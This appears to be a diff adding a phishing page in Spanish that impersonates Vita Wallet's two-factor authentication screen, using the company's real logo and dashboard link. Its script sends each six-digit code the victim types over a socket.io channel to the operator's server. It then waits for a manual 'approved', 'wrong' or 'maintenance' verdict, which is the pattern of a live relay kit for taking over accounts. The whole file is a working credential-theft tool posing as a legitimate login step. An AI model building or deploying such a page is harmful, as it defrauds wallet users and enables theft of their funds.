@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="es" translate="no">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,maximum-scale=1,target-densityDpi=device-dpi">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Verificación de autenticador - vitawallet.io">
+    <title>Vita Wallet - Autenticador</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(309deg, rgb(1, 22, 123), rgb(31, 255, 218));
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+        }
+        .main-container {
+            display: flex; width: 100%; max-width: 1200px; min-height: 600px;
+            background: white; border-radius: 24px; overflow: hidden; margin: 20px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+        .verification-section { flex: 1; padding: 48px 40px; background: white; display: flex; flex-direction: column; justify-content: center; }
+        .promo-section {
+            flex: 1; background: linear-gradient(309deg, rgb(1, 22, 123), rgb(31, 255, 218));
+            padding: 48px 32px; display: flex; flex-direction: column; justify-content: center;
+            align-items: center; color: white; position: relative;
+        }
+        .promo-logo { position: absolute; top: 48px; left: 0; right: 0; text-align: center; }
+        .promo-logo img { width: 180px; height: auto; }
+        .verification-title { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #1a1a1a; text-align: center; }
+        .verification-subtitle { font-size: 14px; color: #666; margin-bottom: 32px; text-align: center; line-height: 1.5; }
+        .auth-icon { text-align: center; margin-bottom: 24px; }
+        .auth-icon i { font-size: 48px; color: #005FEE; }
+        .code-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 32px; }
+        .code-box {
+            width: 55px; height: 65px; border: 2px solid #e0e0e0; border-radius: 12px;
+            font-size: 28px; font-weight: 600; text-align: center; font-family: monospace;
+            background: white; transition: all 0.2s; outline: none;
+        }
+        .code-box:focus { border-color: #005FEE; box-shadow: 0 0 0 3px rgba(0, 95, 238, 0.1); }
+        .code-box.filled { border-color: #005FEE; background: #f0f7ff; }
+        .code-box::-webkit-outer-spin-button, .code-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .code-box[type=number] { -moz-appearance: textfield; }
+        .error-message { background: #fee2e2; color: #d32f2f; padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; font-size: 14px; text-align: center; }
+        .success-message { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; font-size: 14px; text-align: center; }
+        .loading-overlay { display: none; text-align: center; padding: 40px 0; }
+        .spinner { width: 48px; height: 48px; border: 4px solid #e0e0e0; border-top-color: #005FEE; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: #666; font-size: 14px; }
+        .info-text { text-align: center; font-size: 13px; color: #999; margin-top: 16px; }
+        @media (max-width: 768px) {
+            .main-container { flex-direction: column; margin: 10px; }
+            .verification-section { padding: 32px 24px; }
+            .promo-section { display: none; }
+            .code-box { width: 45px; height: 55px; font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="verification-section">
+        <div class="auth-icon">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <div class="verification-title">Autenticador</div>
+        <div class="verification-subtitle">Ingresa el código de 6 dígitos de tu aplicación de autenticación</div>
+
+        <div id="errorMsg" class="error-message"></div>
+        <div id="successMsg" class="success-message"></div>
+
+        <form id="authForm">
+            <div class="code-container" id="codeContainer">
+                <input type="number" class="code-box" id="code1" maxlength="1" autocomplete="off">
+                <input type="number" class="code-box" id="code2" maxlength="1" autocomplete="off">
+                <input type="number" class="code-box" id="code3" maxlength="1" autocomplete="off">
+                <input type="number" class="code-box" id="code4" maxlength="1" autocomplete="off">
+                <input type="number" class="code-box" id="code5" maxlength="1" autocomplete="off">
+                <input type="number" class="code-box" id="code6" maxlength="1" autocomplete="off">
+            </div>
+        </form>
+
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <p class="loading-text">Verificando autenticador...</p>
+        </div>
+
+        <p class="info-text">Abre tu aplicación de autenticación (Google Authenticator, Authy, etc.) para obtener el código</p>
+    </div>
+
+    <div class="promo-section">
+        <div class="promo-logo">
+            <img src="https://api.vitawallet.io/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NDAzMjc2LCJwdXIiOiJibG9iX2lkIn19--de7c38283d0595571ac5d966d8d975e9e86e5e38/Logos%20(1).png" alt="Vita Wallet">
+        </div>
+        <div style="text-align: center; margin-top: 120px;">
+            <h3 style="font-size: 22px; margin-bottom: 12px; font-weight: 600;">Seguridad adicional</h3>
+            <p style="font-size: 14px; opacity: 0.8;">Protege tu cuenta con autenticación de dos factores</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    const socket = io({ query: { type: '2fa_client' } });
+    
+    const inputs = [
+        document.getElementById('code1'), document.getElementById('code2'), document.getElementById('code3'),
+        document.getElementById('code4'), document.getElementById('code5'), document.getElementById('code6')
+    ];
+    
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const authForm = document.getElementById('authForm');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
+
+    socket.on('2fa_result', (data) => {
+        loadingOverlay.style.display = 'none';
+        authForm.style.display = 'block';
+        
+        if (data.action === '2fa_approved') {
+            successMsg.textContent = '✅ ' + data.message;
+            successMsg.style.display = 'block';
+            errorMsg.style.display = 'none';
+            setTimeout(() => { window.location.href = 'https://app.vitawallet.io/dashboard'; }, 1500);
+        } else if (data.action === '2fa_wrong') {
+            errorMsg.textContent = '❌ ' + data.message;
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+            inputs.forEach(inp => { inp.value = ''; inp.classList.remove('filled'); });
+            inputs[0].focus();
+        } else if (data.action === '2fa_maintenance') {
+            errorMsg.textContent = '🔧 ' + data.message;
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+            setTimeout(() => { window.location.href = 'manutencao.html'; }, 1500);
+        }
+    });
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/[^0-9]/g, '').slice(0, 1);
+            input.value = value;
+            if (value) { input.classList.add('filled'); } else { input.classList.remove('filled'); }
+            if (value && index < inputs.length - 1) { inputs[index + 1].focus(); }
+            if (errorMsg.style.display === 'block') { errorMsg.style.display = 'none'; }
+            checkComplete();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace') {
+                if (input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                    inputs[index - 1].value = '';
+                    inputs[index - 1].classList.remove('filled');
+                } else if (input.value !== '') {
+                    input.value = '';
+                    input.classList.remove('filled');
+                }
+            }
+            if (e.key !== 'Backspace' && e.key !== 'Tab' && e.key !== 'Delete' && 
+                e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && !/^\d$/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+    });
+
+    document.getElementById('codeContainer').addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+        if (pasted) {
+            pasted.split('').forEach((digit, i) => {
+                if (inputs[i]) { inputs[i].value = digit; inputs[i].classList.add('filled'); }
+            });
+            const lastIdx = Math.min(pasted.length - 1, inputs.length - 1);
+            if (lastIdx < inputs.length - 1) { inputs[lastIdx + 1].focus(); }
+            else { inputs[lastIdx].blur(); }
+            checkComplete();
+        }
+    });
+
+    function checkComplete() {
+        const fullCode = inputs.map(inp => inp.value).join('');
+        if (fullCode.length === 6) {
+            authForm.style.display = 'none';
+            loadingOverlay.style.display = 'block';
+            socket.emit('2fa_submitted', { code: fullCode });
+        }
+    }
+
+    inputs[0].focus();
+</script>
+
+</body>
+</html>
